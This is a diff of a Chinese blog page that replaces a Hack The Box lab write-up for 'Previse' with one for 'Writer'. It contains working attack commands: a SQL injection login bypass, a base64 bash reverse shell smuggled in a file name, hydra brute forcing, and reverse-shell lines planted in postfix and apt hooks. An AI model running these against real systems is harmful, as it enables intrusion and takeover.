@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>Previse - Crush&#39;s Blog</title>
+  <title>Write - Crush&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Previse">
+            <span class="h2" id="subtitle" title="Write">
               
             </span>
 
@@ -185,7 +185,7 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-18 14:54" pubdate>
+      <time datetime="2021-10-18 15:38" pubdate>
         2021年10月18日 下午
       </time>
     </span>
@@ -197,7 +197,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      710 字
+      923 字
     </span>
   
 
@@ -207,7 +207,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      15
        分钟
     </span>
   
@@ -237,120 +237,163 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Previse</h1>
+            <h1 style="display: none">Write</h1>
             
             <div class="markdown-body">
               <hr>
-<pre><code>参考wp：
-https://davidguest.uk/hack-the-box-previse/
-https://hackhouse.net/htb-previse/
+<pre><code>nmap -A -sS -sV 10.10.11.101 22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) 
+| ssh-hostkey:  
+|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) 
+|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) 
+|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu)) 
+|_http-title: Story Bank | Writer.HTB 
+139/tcp open  netbios-ssn Samba smbd 4.6.2 
+445/tcp open  netbios-ssn Samba smbd 4.6.2
 </code></pre>
-<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1a942ab3f51d91a35671.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>老惯例，nmap 
-nmap -v -sSV -p 22,80 -Pn 10.10.11.104 -T4 -oA nmap/sSV 感觉免费的简单靶场都是22 和 80
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1aca2ab3f51d91a3898a.jpg" srcset="/img/loading.gif" lazyload><br>页面打开是这么个玩意儿<br><img src="https://pic.imgdb.cn/item/616d1aee2ab3f51d91a3aeed.jpg" srcset="/img/loading.gif" lazyload><br>目录扫描没扫出什么东西<br>使用 curl 时，可以从 webapp 获取真正的响应页面，因为 curl 默认不遵循重定向。</p>
+<p><img src="https://pic.imgdb.cn/item/616d35282ab3f51d91bc8801.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>扫描器干他</p>
 <hr>
-<pre><code>curl -is -X GET 10.10.11.104/index.php
+<pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/
 </code></pre>
-<p>访问一下10.10.11.104/accounts.php </p>
 <hr>
-<pre><code>curl -is -X http://10.10.11.104/account.php
+<pre><code>http://10.10.11.101/static/   一个目录遍历 http://10.10.11.101/administrative   一个后台，好像也不是cms ，这种条条框框的用弱口令和注入测一下
 </code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1af42ab3f51d91a3b3ce.jpg" srcset="/img/loading.gif" lazyload><br>发现了3个表单，提交数据 并且说了用户名和密码在5-32个字符之间<br><img src="https://pic.imgdb.cn/item/616d1af72ab3f51d91a3b79b.jpg" srcset="/img/loading.gif" lazyload><br>-d POST 发送有参数的 POST 请求<br>用curl提交post请求访问一下 </p>
+<p>登录哪里抓包，跑到一个注入，登录框的注入，一般应该还有万能密码登录</p>
 <hr>
-<pre><code>curl -is -X POST -d &quot;username=hacker&amp;password=hacker&amp;confirm=hacker&quot; 10.10.11.104/accounts.php  
+<pre><code>跑个万能密码的字典应该也能进 admin &#39; or &#39;1&#39;=&#39;1 admin &#39; or &#39;1&#39;=&#39;1 登录成功
 </code></pre>
-<p>成功登陆。<br><img src="https://pic.imgdb.cn/item/616d1afc2ab3f51d91a3bcde.jpg" srcset="/img/loading.gif" lazyload><br>开始翻网站，翻到一个像是被注入过的一个日志文件<br><img src="https://pic.imgdb.cn/item/616d1b002ab3f51d91a3c109.jpg" srcset="/img/loading.gif" lazyload><br>file目录下有一个上传和一个上传文件的下载 backup，备份，网站备份文件，打开，干他 看备份文件就看config，db，这类的<br><img src="https://pic.imgdb.cn/item/616d1b062ab3f51d91a3c643.jpg" srcset="/img/loading.gif" lazyload><br>解压文件 unzip siteBackup.zip<br><img src="https://pic.imgdb.cn/item/616d1b092ab3f51d91a3c8e1.jpg" srcset="/img/loading.gif" lazyload><br>config.php  是一个数据库配置文件，可以尝试连一下ssh<br><img src="https://pic.imgdb.cn/item/616d1b0d2ab3f51d91a3ccc8.jpg" srcset="/img/loading.gif" lazyload><br>没啥用，继续翻文件logs.php 看到一个exec命令执行的函数<br><img src="https://pic.imgdb.cn/item/616d1b0f2ab3f51d91a3cf92.jpg" srcset="/img/loading.gif" lazyload><br>&amp;&amp; 连接一个反弹shell的命令<br><img src="https://pic.imgdb.cn/item/616d1b122ab3f51d91a3d22e.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d1b172ab3f51d91a3d6af.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d1b1a2ab3f51d91a3d96d.jpg" srcset="/img/loading.gif" lazyload><br>连接成功，是个低权限的 ls 没有要找到的user root flag<br>但是/home/下有一个用户m4lwhere，下面有一个user.txt，需要m4lwhere权限才能访问<br>前面拿到数据库配置的文件，看能不能再数据库里面找到m4lwhere的hash 用hashcat 爆一下<br>构造脚本</p>
+<p><img src="https://pic.imgdb.cn/item/616d352c2ab3f51d91bc8a96.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>sqlmap说有6个字段， test’ union select 1,2,3,4,5,6;–+爆显示位<br><img src="https://pic.imgdb.cn/item/616d35312ab3f51d91bc8d3c.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>读取/etc/passwd文件<br><img src="https://pic.imgdb.cn/item/616d35332ab3f51d91bc8ef8.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>进入后台翻一下，发现有上传文件的功能，但是只能上传图片，</p>
 <hr>
-<pre><code>&lt;?php
-$db = connectDB();
+<pre><code>用kali做一个图片马  
+echo -n &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/1234 0&gt;&amp;1&quot;&#39; | base64 
+得到一个base64 L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==  
 
-$query = &quot;SELECT username, password FROM accounts&quot;;
-$users = $db-&gt;query($query);
-
-if ($users-&gt;num_rows &gt; 0) &#123;
-    while($row = mysqli_fetch_assoc($users)) &#123;
-      var_dump($row);
-    &#125;
-  &#125;
-
-$db-&gt;close();
+touch &#39;1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==| base64 -d | bash`;&#39;  
+file:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==| base64 -d | bash`;#
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/616d35392ab3f51d91bc9273.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>在home下ls发现两个账户 john kyle</p>
+<hr>
+<pre><code>九头蛇跑密码 
+hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh
 </code></pre>
 <hr>
-<pre><code>echo &#39;&lt;上面的代码&gt;&#39; &gt;&gt; status.php里
+<pre><code>进数据库拿kyle的hash,先拿数据库的账号和密码 
+cd /etc/mysql 
+cat mariadb.cnf  
+拿到密码登录
+mysql user = djangouser 
+password = DjangoSuperPassword
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/616d353d2ab3f51d91bc9679.jpg" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<pre><code>mysql -u djangouser -h 127.0.0.1 -p DjangoSuperPassword     
+show databases; 
+use dev; 
+show tables; SELECT * FROM auth_user; 
+拿到hash值去hashcat或john爆破
+忘了截图了。。
 </code></pre>
 <hr>
-<pre><code>curl 10.10.11.104/status.php  访问那个文件，成功读到了他的hash
+<pre><code>kyle 
+marcoantonio 
+ssh kyle@10.10.11.101
 </code></pre>
-<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1b1f2ab3f51d91a3ddcf.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>m4lwhere的hash就是
-$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
-</code></pre>
-<hr>
-<pre><code>用john 或者 hashcat跑hash明文
-</code></pre>
-<hr>
-<pre><code>john
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long
-</code></pre>
-<h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1b242ab3f51d91a3e262.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>hashcat
-hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 500
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1b272ab3f51d91a3e54e.jpg" srcset="/img/loading.gif" lazyload><br>ssh连接拿到第一个user.txt<br><img src="https://pic.imgdb.cn/item/616d1b272ab3f51d91a3e54e.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pic.imgdb.cn/item/616d35412ab3f51d91bc9a6c.jpg" srcset="/img/loading.gif" lazyload></p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr>
-<pre><code>sudo -l  看到一个access_backup.sh的root文件
+<pre><code>准备两个脚本
+python -m SimpleHTTPServer 80 
+传上去
 </code></pre>
 <hr>
-<pre><code>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
-#!/bin/bash
+<pre><code>#!/bin/bash
+# Localize these.
+bash -i &amp;&gt;/dev/tcp/10.10.14.14/4444 0&gt;&amp;1
+INSPECT_DIR=/var/spool/filter
+SENDMAIL=/usr/sbin/sendmail
 
-# We always make sure to store logs, we take security SERIOUSLY here
+# Get disclaimer addresses
+DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
 
-# I know I shouldnt run this as root but I cant figure it out programmatically on my account
-# This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time
+# Exit codes from &lt;sysexits.h&gt;
+EX_TEMPFAIL=75
+EX_UNAVAILABLE=69
 
-gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
-gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
+# Clean up when done or when aborting.
+trap &quot;rm -f in.$$&quot; 0 1 2 3 15
+
+# Start processing.
+cd $INSPECT_DIR || &#123; echo $INSPECT_DIR does not exist; exit
+$EX_TEMPFAIL; &#125;
+
+cat &gt;in.$$ || &#123; echo Cannot save mail to file; exit $EX_TEMPFAIL; &#125;
+
+# obtain From address
+from_address=`grep -m 1 &quot;From:&quot; in.$$ | cut -d &quot;&lt;&quot; -f 2 | cut -d &quot;&gt;&quot; -f 1`
+
+if [ `grep -wi ^$&#123;from_address&#125;$ $&#123;DISCLAIMER_ADDRESSES&#125;` ]; then
+  /usr/bin/altermime --input=in.$$ \
+                   --disclaimer=/etc/postfix/disclaimer.txt \
+                   --disclaimer-html=/etc/postfix/disclaimer.txt \
+                   --xheader=&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot; || \
+                    &#123; echo Message content rejected; exit $EX_UNAVAILABLE; &#125;
+fi
+
+$SENDMAIL &quot;$@&quot; &lt;in.$$
+
+exit $?
+</code></pre>
+<p>这是修改原文件/etc/postfix/disclaimer后得到的脚本，这里只是举个例子，该靶机无法使用bash和sh进行反弹 shell。可以使用python或socat进行getshell，由于懒，我就不修改了 查看文件/etc/postfix/disclaimer_addresses得到邮箱<a href="mailto:&#x6b;&#x79;&#x6c;&#101;&#x40;&#119;&#x72;&#x69;&#x74;&#101;&#114;&#x2e;&#x68;&#x74;&#98;">&#x6b;&#x79;&#x6c;&#101;&#x40;&#119;&#x72;&#x69;&#x74;&#101;&#114;&#x2e;&#x68;&#x74;&#98;</a> 使用该邮箱编写脚本</p>
+<hr>
+<pre><code>import smtplib
+host = &#39;127.0.0.1&#39;
+port = 25
+
+sender_email = &quot;kyle@writer.htb&quot;
+receiver_email = &quot;kyle@writer.htb&quot;
+message = &quot;&quot;&quot;\
+Subject: Hi there
+
+Test_python_sender.&quot;&quot;&quot;
+
+try:
+    server = smtplib.SMTP(host, port)
+    server.ehlo()
+    server.sendmail(sender_email, receiver_email, message)
+except Exception as e:
+    print(e)
+finally:
+    server.quit()
+</code></pre>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d354c2ab3f51d91bca4bb.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>访问/home/john/.ssh文件拿到id_rsa 
+kali本地创建id_rsa复制内容 
+chmod 600 id_rsa   
+ssh -i id_rsa john@10.10.11.101
 </code></pre>
 <hr>
-<pre><code>cd /tmp
-cat &lt;&lt; EOF &gt; gzip
-&gt; #!/bin/bash
-&gt; cp /bin/bash /tmp/c
-&gt; chmod u+s /tmp/c
-&gt; EOF
-chmod +x gzip
-export PATH=$( pwd ):$PATH
+<pre><code>提权参考：
+https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/616d39622ab3f51d91bfd97f.jpg" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<pre><code>cd /etc/apt/apt.conf.d  
+echo &#39;apt::Update::Pre-Invoke &#123;&quot;echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTAwODYgMD4mMSI= | base64 -d | bash&quot;&#125;;&#39;&gt; pwn 
 
-sudo /opt/scripts/access_backup.sh
-./c -p
+base64：
+/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/10086 0&gt;&amp;1&quot; 
+nc -nvlp 10086  多等会儿，root权限就来了最后一个在root下 cat root.txt就行了
 </code></pre>
-<hr>
-<pre><code>提权不是很懂，这个有点像是环境变量劫持，成功提权
-</code></pre>
-<hr>
-<pre><code>514371f6578495a1ae9624f3a199f944
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d1b302ab3f51d91a3ed10.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://pic.imgdb.cn/item/616d396b2ab3f51d91bfe01a.jpg" srcset="/img/loading.gif" lazyload></p>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/Hack-The-Box/">Hack The Box</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/Hack-The-Box/">Hack The Box</a>
-                    
-                  </div>
                 
               </div>
               
@@ -365,18 +408,12 @@ sudo /opt/scripts/access_backup.sh
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/18/Horizontall/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Horizontall</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/18/BountyHunter/">
-                        <span class="hidden-mobile">BountyHunter</span>
+                      <a href="/2021/10/18/Seal/">
+                        <span class="hidden-mobile">Seal</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
